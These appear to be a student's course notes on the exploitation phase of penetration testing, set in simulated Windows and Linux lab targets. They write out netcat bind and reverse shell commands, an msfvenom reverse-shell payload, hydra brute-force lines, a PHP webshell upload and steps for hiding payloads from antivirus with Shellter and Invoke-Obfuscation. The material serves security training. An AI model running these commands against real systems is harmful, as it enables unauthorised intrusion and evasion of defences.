```toc
```
# Host & Network Penetration Testing: Exploitation #

## Introduction ##

**Topic Overview**
+ Introduction To Exploitation 
+ Vulnerability Scanning 
+ Searching For Exploits
+ Fixing Exploits 
+ Bind & Reverse Shells 
+ Exploitation Frameworks 
+ Windows Exploitation 
+ Linux Exploitation 
+ AV Evasion & Obfuscation 

**Learning Objectives** 
+ Get an introduction to the exploitation phase of a penetration test
+ Learn how to identify vulnerable services
+ Learn how to search for, modify and compile  publicly available exploit code
+ Get an understanding how how bind and reverse shells work
+ Get an understanding of the various exploitation frameworks available, as well as how they can be used to streamline exploitation 
+ Will learn both how to exploit Windows & Linux systems in a simulated black box penetration test
+ Learn how to evade signature based AV solutions 

### Introduction To Exploitation ###

#### Exploitation ####
+ Consists of techniques and tools used by adversaries/penetration testers to gain an initial foothold on a target system or network 
+ Successful exploitation will heavily depend on the nature and quality of information gathering and service enumeration performed on the target
	+ Can only exploit a target if we know what is vulnerable 
+ Have already covered exploration of Windows & Linux systems both manually and automatically
	+ We still need a clearer picture of the exploitation methodology and the tools and techniques involved in the process 

#### Penetration Testing Execution Standard ####
+ (PTES) is a penetration testing methodology that was developed with the aim of addressing the need for comprehensive and up-to-date standard for penetration testing 

![[Screen Shot 2022-10-21 at 1.32.49 PM.png]]


## Vulnerability Scanning ##

### Banner Grabbing ###

+ Banner grabbing is an information gathering technique used by penetration testers to enumerate information regarding the target OS as well as the services that are running it its open ports
+ The primary objective is to identify the service running on a specific port as well as the service version
+ Banner grabbing can be performed through various techniques
	+ Performing a service version detection scan with Nmap 
	+ Connecting to the open port with <mark class="hltr-green">Netcat</mark>
		+ Netcat is thought as the most accurate
	+ Authenticating with the service (If it supports it), for example: SSH, FTP, Telnet, etc.

#### Hands on ####
+ Will first start with <mark class="hltr-yellow">nmap</mark> 
	+ `-sV` : Will get service version
		+ Can enumerate the version of a service 
	+ -`O` : Will get OS
+ `nmap -sV --script=banner <IP>` will do banner grabbing 
+ <mark class="hltr-red">netcat</mark> `nc` can be used for banner grabbing 
	+ `nc <ip> <port>`
	+ `-v` will make it verbose 
+ With the information found, can use <mark class="hltr-blue">searchsploit</mark> to see if anything is vulnerable 

### Vulnerability Scanning With Nmap Scripts ###

[Nmap Scripting Engine](https://nmap.org/book/nse.html)
+ The above resource can be used to learn more about the <mark class="hltr-red">Nmap Scripting Engine</mark>
	+ One of Nmap's most powerful features 
	+ Scripts are available and can be written to do things such as network discovery, better version detection, and vulnerability scanning 

#### Nmap Vulnerability Scanning ####
+ Nmap scripts can be seen with `ls -al /usr/share/nmap/scripts/`
+ Can be used for automation 
	+ can pipe it and look for specific things, for example ` | grep http` 
+ Can use a specific script with `--script=SCRIPT_NAME` with nmap and the target
+ The scripts `.nse` are written in <mark class="hltr-green">Lua</mark> programming language

#### Shellshock ####
+ Nmap has a <mark class="hltr-red">shellshock</mark> script `http-shellshock`
	+ Will test if a machine is vulnerable to shellshock
	+ `.cgi` scripts are often vulnerable, if seen in the html, should test it
		+ .cgi scripts are use to run commands on the server, usually in c, can be thought of as terminal access to the machine from the webserver
	+ will need the `--script-args "http-shellshock.uri/gettime.cgi"` for example, where the args is the relative path to the cgi file

### Vulnerability Scanning With Metasploit ###

#### Metasploit ####
+ Can use this framework for vulnerability detection 
+ Can  use `search` vulnerabilities, and <mark class="hltr-red">searchsploit</mark> will show if it is available in MSF

## Exploits ##

### Searching For Publicly Available Exploits ###

#### Post Vulnerability Identification ####
+ Should now search for exploit code of the target or service now that it is identified
+ Need to verify it can actually be exploited
+ Can be found easily online, though it is recommended to analyze the code to make sure it will work as intended 
+ Legitimate and vetted exploit databases that should be used online:
	+ [Exploit-db](https://www.exploit-db.com/)
		+ This also has the google hacking database with good dorking commands 
	+ [Rapid7](https://www.rapid7.com/db/)
	+ Can also use <mark class="hltr-green">github</mark>, but need to be sure what is being ran
+ Can also use google dorks and search google with:
	+ `site:exploit-db.com`
	+ `site:rapid7.com`
+ [Packet storm](https://packetstormsecurity.com/)
	+ Good for the latest news regarding vulnerabilities 

### Searching For Exploits With SearchSploit ###

#### SearchSploit ####
+ In certain cases, you may not have access to the online exploits and as a result, must be able to use the exploit sources available locally 
+ The entire Exploit-db databases of exploits comes pre-packaged with Kali Linux
	+ Consequently providing all exploits locally
+ The Exploit-db offline database of exploits can be accessed and queried with the tool called <mark class="hltr-red">SearchSploit</mark> 
+ Can update with `sudo apt-get update && sudo apt-get install exploitdb -y`
+ can see with `ls -al /usr/share/exploitdb`
	+ Can look in that file and see that there is exploits categorized by OS 
	+ Though searchsploit is better used for this 
+ `searchsploit -u` Will update the database 

#### Searching With SearchSploit ####
+ Can do `searchsploit <name> <version>` 
	+ Will specify local path to exploit 
+ Can copy exploit into local directory with `searchsploit -m <id>` 
+ `-c` Will make the search case sensitive 
+ `-t` Will look for a keyword in the title
+ `-e` Will be an exact search 
+ `-w` Will give the web link 
+ Can use searchsploit to specify the categories of the exploit
	+ Example `searchsploit remote windows smb`

### Fixing Exploits ###

#### Exploit Analysis ####
+ After a exploit is identified with searchsploit will be able to download it 
+ Once downloaded, can read the code, which will be documented with comments 
	+ May have to change certain situation based variables, or do other things to prep for the exploit 
	+ May have to have a Netcat listener going 

### Cross-Compiling Exploits ###

#### Cross-Compiling ####
+ Exploit code will be developed in C/C++/C#
	+ So it will need to be compiled into a PE (Portable Executable) or binary
+ Cross-Compiling is the process of compiling code for a platform other than the one performing the compilation
+ <mark style="background: #FF5582A6;">Mingw-w64</mark> 
	+ Used to compile software for Windows PE applications 
	+ Install with `sudo apt-get install mingw-w64` 
	+ Can now do: `i686-w64-mingw32-gcc test.c -o test` 
	+ Adding `-lw2_32` will specify for 32 bit systems
+ <mark style="background: #BBFABBA6;">Githubs exploitdb-bin-sploits</mark>
	+ Has precompiled exploits 


## Shells ##

### Netcat Fundamentals ###

#### Netcat ####
+ Aka <mark style="background: #FFF3A3A6;">TCP/IP Swiss Army Knife</mark>, a networking utility used to read and write data to network connections using TCP or UDP
+ Netcat is available for both NIX and Windows OS's, consequently making it extremely useful for cross-platform engagements
+ Netcat utilizes a client-server communication architecture with two modes:
	+ Client mode - Netcat can be used in client mode to connect to any TCP/UDP port as well as a Netcat listener (server)
	+ Server mode - Netcat can be used to listen for connections from clients on a specific port
+ Netcat can be used by penetration testers to perform the following functionality:
	+ Banner Grabbing
	+ Port Scanning 
	+ Transferring Files
	+ Bind/Reverse Shells 

#### Netcat Common Flags ####
+ `nc --help`
	+ Shows all the documentation, or can use the man pages 
+ `-v`
	+ Give additional information on actions 
+ `-u`
	+ Specifies UDP, be default it will do TCP
+ `-l` 
	+ Used to specify listener 
+ `-n`
	+ Will not resolve hostnames via DNS
+ `-e`
	+ Will execute a specific command 

#### Connect to ports ####
+ Output of the connection can be a service banner (banner grabbing)
+ `nc -nv <IP> <PORT>`
	+ So DNS resolve is disabled and will give more information (like if it connected)
	+ Could not connect do to filtering or a firewall as well 
+ Can transfer netcat to a windows machine
	+ The binary is under `/usr/share/windows-binaries/nc.exe`
	+ Can host a web server holding the executable using `python -m SimpleHTTPServer 80` 
		+ Will host everything in the current directory
	+ Will now navigate to that IP in a browser, or using the command prompt `certutil -urlcache -f http://<IP>/nc.exe nc.exe` 

#### Setup a listener ####
+ `nc -nvlp <PORT>`
	+ DNS resolve is disabled, Verbose is on, is a listener, with port specified after the -p
+ When they are connected, can send messages by typing characters 

#### Transfer a File ####
+ Can make a file, for example: `vim test.txt` (or any other file type)
+ After they are connected, can do `nc -nv <IP> <PORT> < test.txt` 

### Bind Shells ###

#### Shell ####
+ A utility that allows you to execute commands on the system
+ Remote shell allows you to execute commands **remotely** 

#### Bind Shells ####
+ A bind shell is a type of remote shell where the attacker connects directly to a listener on the target system, consequently allowing for execution of commands on the target system 
+ A netcat listener can be setup to execute a specific executable like `cmd.exe` or `/bin/bash` when a client connects to the listener 
	+ Will be done via the `-e` option 
![[Screen Shot 2022-11-02 at 2.01.24 PM.png]]

+ <mark style="background: #FF5582A6;">Reverse shells are much better than bind shells</mark> 
	+ Would need to setup a netcat listener on the target system with a bind shell, which has issues
	+ From the perspective of network security, in bound traffic is mostly blocked by the firewall 
		+ So if the attacker is sending something to the listener from this perspective, a firewall in the middle could stoop it 
	+ <mark style="background: #FFF3A3A6;">Inbound traffic is much more suspect in a network</mark>

#### Making a Bind Shell ####
+ If the target machine is <mark style="background: #ADCCFFA6;">windows</mark>, will need to **transfer over netcat** 
	+ Will go where the binary is located: `cd /usr/share/windows-binaries`
	+ Start a webserver using `python -m SimpleHTTPServer 80`
	+ On the target, can now navigate to a browser, or use `certutil`
+ Will start a <mark style="background: #BBFABBA6;">listener</mark> on the <mark style="background: #BBFABBA6;">target machine</mark>:
	+ `./nc.exe -nvlp 1234 -e cmd.exe`
		+ So it will listen on port 1234, and when there is a connection, cmd.exe will be executed
+ Will <mark style="background: #FF5582A6;">connect</mark> from the <mark style="background: #FF5582A6;">attacker machine</mark> to the <mark style="background: #FF5582A6;">target machine</mark>:
	+ `nc -nv <IP_Target> 1234`
+ Now have access to the target machine:
	+ Can do `whoami` to see the privileges 
	+ `dir` to see what is in the directory 
	+ Etc

### Reverse Shell ###

#### Reverse Shells ####
+ A reverse shell is a type of remote shell where the target connects directly o a listener on the attackers system, consequently allowing for execution of commands on the target system 
![[Screen Shot 2022-11-02 at 2.26.16 PM.png]]
+ Do not need to set up a listener on the target system 
+ And the traffic is less likely to be blocked if the target is initiating the traffic
+ The attackers IP will need to be sent to the client, so this needs to be removed quickly 

#### Making a Reverse Shell ####
+ On the <mark style="background: #FF5582A6;">attacker machine</mark>, will set up a <mark style="background: #FF5582A6;">listener</mark> 
	+ `nc -nvlp 1234`
		+ Where `c` will execute with the linux terminal 
+ On the <mark style="background: #BBFABBA6;">victim machine</mark>, will <mark style="background: #BBFABBA6;">connect to the attacker</mark> and <mark style="background: #BBFABBA6;">execute the shell</mark> 
	+ `-nc -nv <IP_Attacker> 1234 -e cmd.exe`
	+ Can also be done without netcat, using power shell for example

### Reverse Shell Cheatsheet ###

+ Do not need netcat on the target system, can use all sorts of methods to initiate the connection
	+ [PayloadAllTheThings Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
		+ Contains a large list of what to run, depending on the target OS or circumstance 
		+ For windows, will need to use the Powershell version, or python
		+ For webservers, can use PHP for example
	+ [Reverse Shell Generator](https://www.revshells.com/)
		+ Another option for getting payloads, will specify the following
			+ Attacker IP
			+ Port
			+ Listener type to run on the attacker
			+ Type of shell
			+ For reverse, will specify the OS, and click on that works 
		+ Will copy what is for the target, as well as the attacker 

## Frameworks ##

### The Metasploit Framework (MSF) ###

+ <mark style="background: #FF5582A6;">See more details in the Metasploit course </mark>

### PowerShell-Empire ###

#### PowerShell-Empire ####
+ Uses pure PowerShell exploitation/post-exploitation framework built on cryptological-secure communications and flexible architecture (no enumeration, information gathering, mostly windows targets being exploited)
+ Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from keyloggers to Mimikatz, and adaptable communication to evade network detection all wrapped up in usability-focused framework
+ PowerShell Empire recently received an update and is now officially supported and maintained by Kali Linux 

#### Starkiller ####
+ In addition to being updated and modernized, BC Security, the company responsible for maintaining the Empire also made a companion called **Starkiller**
+ Starkiller is a GUI Frontend for the Powershell Empire. It is an electron application written in VueJS and provides users with an intuitive way of interacting with Empire 
+ In order to get an understanding of how Empire works, and the components that make up the framework, should use the official documentation [Empire Documentation](https://www.powershellempire.com/) 
+ PowerShell-Empire & Starkiller are both available as packages in the Kali Linux repositories

#### Installation ####
+ Should first do `sudo apt-get update`
+ Then, `sudo apt-get install powershell-empire starkiller -y`
+ Will now start up the powershell-empire server with `sudo powershell-empire server`

#### Empire Usage ####
+ Can interact with the server using: `sudo powershell-empire client` 
	+ Will be similar to msfconsole 
+ Can see items such as `listeners`, and `agents` 

#### Starkiller Usage ####
+ Can start it from within apps
+ Default credentials is `empireadmin`, and `password123`
	+ Should update password 
+ Should startup the C# server 
+ There is nearly 400 <mark style="background: #FFF3A3A6;">modules</mark> filled with windows exploitation or post-exploitation modules
	+ It also has some mac OS and multi option 
+ <mark style="background: #FFF3A3A6;">Listeners</mark>: Will listen for connection 
+ <mark style="background: #FFF3A3A6;">Stages</mark>: Exploit code to run on the target system 
	+ Will need to deliver it 
+ <mark style="background: #FFF3A3A6;">Agents</mark>: All systems to exploit or that has been exploited 

#### Starkiller methodology ####
+ Will first create a listener 
	+ The http listener is a good options, differences should be seen in the documentation
	+ Will need to configure the attacker IP, and the port 
+ Will now generate a stager 
	+ And run that on the target system 
+ Will now have an agent available 
	+ Have remote access to the system 
+ Can execute a module on the agent 

## Windows ##

### Windows Black Box Penetration Test ###

#### Black Box Pentest ####
+ A security assessment where the penetration tester is not provided any information regarding the target system or network (No IP ranges, system info or default credentials)
+ The objective of the Black box penetration test is to accurately test the security of a system or network as an external unprivileged adversary 
+ Useful as it demonstrates how an external attacker with no inside knowledge would compromise a companies systems or networks

#### Penetration Testing Phases ####
![[Screen Shot 2022-11-02 at 4.10.20 PM.png]]

#### Scenario & Scope ####
+ You have just begun your first job as a Junior Penetration Tester and have been assigned to assist in performing a penetration test on a client's network
+ The pentest lead has assigned you to gain access/exploit a host running Windows Server 2008
+ Primary objectives:
	+ Identify services running on the target 
	+ Identify vulnerabilities within the services
	+ Exploit these vulnerabilities to obtain an initial foothold

### Port Scanning & Enumeration ###

#### Identifying targets on the network ####
+ Can `cat /etc/host` to see hosts that have been discovered so far 
+ Can also scan local network with `nmap <IP>/CIDR` 
	+ Example `nmap 10.10.10.0/24` 
+ Will `ping` the target to verify its up 

#### Scanning the target ####
+ `nmap <IP>`
	+ `-T4` for a quick scan
	+ `-PA` ACK ping
	+ `-sC` default script scan
	+ `-sV` version detection 
	+ `-p` specify port, or port range: P_BEGIN-P_END, or -p-
	+ `-oX <FILENAME>` Export as XML
	+ `sU` to scan UDP ports 
+ Can use the <mark style="background: #ADCCFFA6;">browser</mark> for anything web 
+ Can use <mark style="background: #FFB86CA6;">netcat</mark> to do banner browsing on ports such as SSH

#### Import to MSF ####
+ `db_import /PATH/TO/FILE.xml` 
+ Can now use `hosts` to see hosts found, and `services` to see its services 
+ `smb_version` is a good <mark style="background: #FF5582A6;">metasploit module</mark> to quickly fingerprint a windows machines OS
+ MSF should have a unique workspace to stay organized

### Targeting Microsoft IIS FTP ###

#### Microsoft IIS ####
+ A web server used to host web applications 
	+ Microsoft FTP is part of the IIS package, and runs on port 21 on the same machine 
	+ An FTP credentials for this will very often be a IIS login as well 
	+ FTP IIS will very be the directory of the website, so can make changes to the resources on the website with FTP to manipulate the IIS website 

#### Methodology ####
+ Will first test <mark style="background: #FF5582A6;">anon login</mark> with `nmap -sV -p 21 --script=ftp-anon <IP>`
	+ or manually by doing `ftp <IP>` and then skip username and password 
+ Will now <mark style="background: #FF5582A6;">brute-force</mark> the login with <mark style="background: #D2B3FFA6;">hydra</mark> 
	+ `hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <IP> ftp`
+ Can upload an asp <mark style="background: #FF5582A6;">payload</mark> for example if the FTP service connects to the IIS web directory 
	+ Will generate with `msfvenom -p windows/shell/reverse_tcp LHOST=<Attacker_IP> LPORT=1234 -f asp > shell.asp`
	+ Upload in FTP us done by <mark style="background: #FFF3A3A6;">put</mark>  and then the name of the file 
+ Can also download from the website with <mark style="background: #BBFABBA6;">get</mark>, and put it back with the same name 

### Targeting OpenSSH ###

#### Methodology ####
+ Should use any previous passwords found to test if there is password sharing 
+ Brute-forcing with <mark style="background: #D2B3FFA6;">hydra</mark>:
	+ `hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <IP> ssh`
+ Can login with ssh 
	+ `ssh USER@<IP>`
	+ Can now do `whoami` 
	+ Will use `bash` to get a command prompt 
		+ Can do `localgroup` and `whoami /priv`
+ Can change the ssh to a <mark style="background: #FF5582A6;">meterpreter</mark> session 
	+ `ssh_login` module will do that
	+ Then can do session -u 1
	+ Can also download the meterpreter to that system and run it

### Targeting SMB ###

#### Methodology ####
+ Brute-forcing with <mark style="background: #D2B3FFA6;">hydra</mark>:
	+ `hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <IP> 
+ Authenticate to SMB with <mark style="background: #FFF3A3A6;">smbclient</mark> with user and password
	+ `smbclient -L <IP> -U <USER>`
+ Enumerate shares with <mark style="background: #FFF3A3A6;">smbmap</mark> 
	+ `smbmap -u <USER> -p <PASSWORD> -H <IP>`
+ Enumerate other user accounts with credentials we already have using <mark style="background: #FFF3A3A6;">enum4linux</mark> 
	+ `enum4linux -u <USER> -p <PASSWORD> -U <IP>`
	+ Can also use the <mark style="background: #FF5582A6;">metasploit</mark> module `smb_enumusers` 
+ Authenticate to a SMB system remotely with legitimate credentials using <mark style="background: #FFF3A3A6;">psexec</mark>
	+ `python3 psexec.py <USER>@<IP>`
	+ Can also use the <mark style="background: #FF5582A6;">metasploit</mark> module `psexec` , to get a meterpreter session 
+ On metasploit, can also use the <mark style="background: #ADCCFFA6;">ms17_010_eternalblue</mark> module if the machine is vulnerable 
	+ Will get elevated privileges quickly 

### Targeting MySQL Database Server ###

#### Methodology ####
+ 3306 is the default MySQL port
+ Can brute-force with hydra, but can also use the <mark style="background: #FF5582A6;">metasploit</mark> module `mysql_login` 
+ Can login to the server using:
	+ `mysql -u root -p -h <IP>`
+ Once logged in, can enumerate 
	+ `show databases;`
		+ Might show a database related to to websites as well
+ Can also get the mysql credentials in the Wordpress config file if it is connected to Wordpress and there is access on the machine 
	+ Any changes to a WAMP or Wordpress will require a restart:
		+ `net stop SERVICE`, then `net start SERVICE`


## Linux ##

### Linux Black Box Penetration Test ###

#### Penetration Testing Phases ####
![[Screen Shot 2022-11-02 at 4.10.20 PM.png]]

### Port Scanning and Enumeration ###

#### Identifying targets on the network ####
+ Can `cat /etc/host` to see hosts that have been discovered so far 
+ Can also scan local network with `nmap <IP>/CIDR` 
	+ Example `nmap 10.10.10.0/24` 
+ Will `ping` the target to verify its up 

#### Scanning the target ####
+ `nmap <IP>`
	+ `-T4` for a quick scan
	+ `-PA` ACK ping
	+ `-sC` default script scan
	+ `-sV` version detection 
	+ `-p` specify port, or port range: P_BEGIN-P_END, or -p-
	+ `-oX <FILENAME>` Export as XML
	+ `sU` to scan UDP ports 
+ Can use the <mark style="background: #ADCCFFA6;">browser</mark> for anything web 
+ Can use <mark style="background: #FFB86CA6;">netcat</mark> to do banner browsing on ports such as SSH

#### Import to MSF ####
+ `db_import /PATH/TO/FILE.xml` 
+ Can now use `hosts` to see hosts found, and `services` to see its services 
+ `smb_version` is a good <mark style="background: #FF5582A6;">metasploit module</mark> to quickly fingerprint a windows machines OS
+ MSF should have a unique workspace to stay organized

### Targeting vsFTPd ###

#### Initial scan ####
+ Nmap's -sC will quickly tell you if  anonymous logins are aloud 
	+ Easy low hanging fruit 
	+ Though might not have any access 
+ Will also provide information about the FTP server status 

#### Exploit ####
+ version 2.3.4 has a metasploit module and a python exploit 
+ Can be found and inspected with searchsploit 
+ Though an admin **can remove the backdoor** in this version
	+ Specifically that the service can have a remote shell on port 6200

#### Brute-force ####
+ Before doing username brute-forcing on the system, should look into other services to see if there are other ways to easily get usernames
	+ For example, if SMTP is running on port 25, can enumerate passwords from it 
	+ `smtp_enum` is the <mark style="background: #FF5582A6;">metasploit module</mark> that can identify user accounts on the system to make the ftp brute-force more efficient 
+ <mark style="background: #D2B3FFA6;">Hydra</mark> attack:
	+ `hydra -l service -P /user/share/metasploit-framework/data/wordlists/unix_users.txt <IP> ftp`
	+ Can now login with `ftp USERNAME@IP`

#### After access ####
+ Now that we are in FTP, can determine if it is hosting anything related to another service
+ For example, a website technology, such as webdav, can be using that directory for the website (webdav is default under the var directory)
	+ Can upload a php reverse shell from `ls -al /usr/share/webshells/` for webdav
		+ Will need to modify some information 
	+ will then `put shell.php`, and can click on it in the browser
		+ Will be connected as that service account 

### Targeting PHP ###

+ When accounting a webserver should analyze the:
	+ Web service technology (Such as Apache)
	+ Operating System
	+ Web server programming (Such as PHP)
	+ Database (Such as MySQL or Postgresql)

#### Initial Scan ####
+ With `-sV` and `-sC` can sometimes see the service and version, as well as the OS
+ Can also use `/phpinfo.php` on the main directory in a browser to potentially see some version info about php

#### Exploit ####
+ With <mark style="background: #ADCCFFA6;">searchsploit</mark>, can see that version lower than 5.4.2 can be vulnerable 
	+ CGI Argument Injection is one possibility 
	+ Will need to change the pwn code specified to a reverse shell or another example of increasing access 

### Targeting Samba ###

#### Initial Scan####
+ This is the linux implementation of SMB also on 445
+ Can use -`sV` and `-sC` again, as well as netcat 
+ <mark style="background: #FF5582A6;">Metasploit</mark> has a module `smb_version` that is also helpful for initial enumeration 
	+ 3.0.20 for example is vulnerable to the Username map script metasploit module

#### Exploit ####
+ The <mark style="background: #FF5582A6;">module</mark> is called `usermap_script` that can provide a netcat reverse shell 


## Obfuscation ##

### AV Evasion With Shelter ###

#### Defense Evasion ####
+ Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscation/encrypting data and script. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware **-MITRE** 

#### AV Detection Methods ####
1. <mark style="background: #BBFABBA6;">Signature based detection</mark> - An AV signature is a unique sequence of bytes that uniquely id malware (Usually a hash of the executable). As a result, will have to ensure that you obfuscated exploit or payload does not match any known signature in the AV database
	+ Can bypass signature-based detection by modifying the malware's byte sequence, changing its signature 
1. <mark style="background: #BBFABBA6;">Heuristic-based detection</mark> - Relies on rules or decisions to determine whether a binary is malicious. It also looks for specific patterns within the code or program calls
2. <mark style="background: #BBFABBA6;">Behavior based detection</mark> - Relies on identifying malware by monitoring its behavior 

#### AV Evasion Techniques ####

**On-Disk Evasion** 
+ <mark style="background: #FF5582A6;">Obfuscation</mark> - Obfuscation refers to the process of concealing something important, valuable, or critical. Obfuscation reorganizes code in order to make it harder to analyze or RE
+ <mark style="background: #FF5582A6;">Encoding</mark> - The process involving changing data into a new format using a scheme. Encoding is a reversible process; data can be encoded to a new format and decoded to its original format (For example: base64)
+ <mark style="background: #FF5582A6;">Packing</mark> - generating executable with new binary structure with a smaller size and therefore provides the payload with a new signature 
+ <mark style="background: #FF5582A6;">Crypters</mark> - Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub 

**In-Memory Evasion Techniques**
+ Focuses on manipulation of memory and does not write files to disk
+ Injects payload into a process by leveraging various Windows APIs
+ Payload is then executed in memory in a separate thread 

#### Shellter ####
+ A dynamic shellcode injection tool 
+ Can inject shellcode into native Windows application (currently 32-bit only
+ Takes advantage of PE (Portable Executable) files 
+ Shelter is not just an EPO infector that tries to redirect execution 
+ Will need to use Wine32 to make linux compatible to execute windows executables
	+ Can then launch with `sudo wine shellter.exe` 
+ Will need to download a <mark style="background: #ADCCFFA6;">simple executable</mark> to <mark style="background: #ADCCFFA6;">hide the payload</mark> 
	+ can use `/usr/share/windoes-binaries/vncviewer.exe` 

+ Will ask Operation Mode, can use <mark style="background: #FF5582A6;">A</mark> for automatic
+ Now will specific the <mark style="background: #FF5582A6;">PE Target</mark> , for example `vncviewer.exe`
+ Can enable <mark style="background: #FF5582A6;">stealth mode</mark>, meaning if we want the exe to function as it normally does
+ Will now <mark style="background: #FF5582A6;">specify what payload</mark> to use 
	+ Can do a custom with <mark style="background: #FFB86CA6;">msfvenom</mark> 
+ Will then put IP info

+ Will now need to <mark style="background: #FFF3A3A6;">transfer and run the executable on the target</mark> 

### Obfuscating PowerShell Code ###

#### Obfuscation ####
+ Refers to the process of concealing something important, valuable, or critical. Obfuscation reorganizes code in order to make it harder to analyze or RE (Reverse Engineer)
+ As a penetration tester, will be working with PowerShell code frequently. Most AV solutions will immediately flag malicious Powershell code, as a result, will need to obfuscate the powerShell code and scripts in order to avoid detection. 

#### Invoke-Obfuscation ####
+ An open source PowerShell v2.0+ compatible PowerShell command and script obfuscator.
+ [Invoke-Obfuscation Github Repo](https://github.com/danielbohannon/Invoke-Obfuscation) 
+ The payloadAllTheThings git will come in handy with payloads 
+ Can launch <mark style="background: #BBFABBA6;">powershell on linux</mark> with `pwsh` 
+ After cloning the Repo, after using `pwsh`, will do:
	+ `Import-Module ./Invoke-Obfuscation.psd1`
	+ can now run `./Invoke-Obfuscation` to launch it

#### Invoke-Obfuscation Options ####
![[Screen Shot 2022-11-07 at 4.33.24 PM.png]]
+ AST is most likely the best option
+ can use `help` to see how to use the tool 
+ Will now have <mark style="background: #FF5582A6;">new powershell code that will not resemble the previous payload</mark> 